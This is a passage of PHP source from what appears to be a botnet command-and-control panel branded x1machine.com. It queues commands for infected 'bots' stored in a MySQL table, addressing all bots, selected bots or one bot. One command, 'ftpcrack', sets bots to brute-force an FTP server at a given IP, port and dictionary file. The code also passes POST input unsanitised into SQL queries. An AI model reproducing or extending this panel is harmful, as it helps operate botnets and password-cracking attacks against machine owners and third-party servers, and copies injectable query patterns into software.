		echo "Selecting all bots for this command is not implemented!</table></center>
		<center><font size='1'>&copy www.x1machine.com</font></center>
		</div></center></body></html>";	
	exit();
	}
	mysql_query("UPDATE $table SET cmd='$crycmd'"); 
	echo "<script>location=\"?page=".$_GET['page']."\";</script>"; 
} else if ($botip == "checked"){
	if($_POST['newcmd'] == "ftpcrack"){
		echo "Selecting checked bots for this command is not implemented!</table></center>
		<center><font size='1'>&copy www.x1machine.com</font></center>
		</div></center></body></html>";	
	exit();
	}
	$box = $_POST['box'];
	foreach ( $box as $k=> $c)
	{
	mysql_query("UPDATE $table SET cmd='$crycmd' WHERE name='$c'");
	echo "<script>location=\"?page=".$_GET['page']."\";</script>";
	}
} else {
	if($_POST['newcmd'] == "ftpcrack"){
	$ips = $_POST['arg1'];
	$ports = ""; $dict_file = "";
	$res = mysql_query("SELECT * FROM $ftp_table WHERE ip = '$ips'");
		while ($row = mysql_fetch_assoc($res)) {
		$ports = $row[port]; $dict_file = $row[dict];
		}
		$newcmd = "ftpcrack!".$ips."!".$ports."!".$dict_file;
		$crycmd = $newcmd		;
		mysql_query("UPDATE $table SET cmd='$crycmd' WHERE name='$botip'");
		echo "<script>location=\"?page=".$_GET['page']."\";</script>";
	} else {
	mysql_query("UPDATE $table SET cmd='$crycmd' WHERE name='$botip'");
	echo "<script>location=\"?page=".$_GET['page']."\";</script>";
	}}
}

?>
</table></center>
<center><font size='1'>&copy www.x1machine.com</font></center>
</div></center>

</body></html>
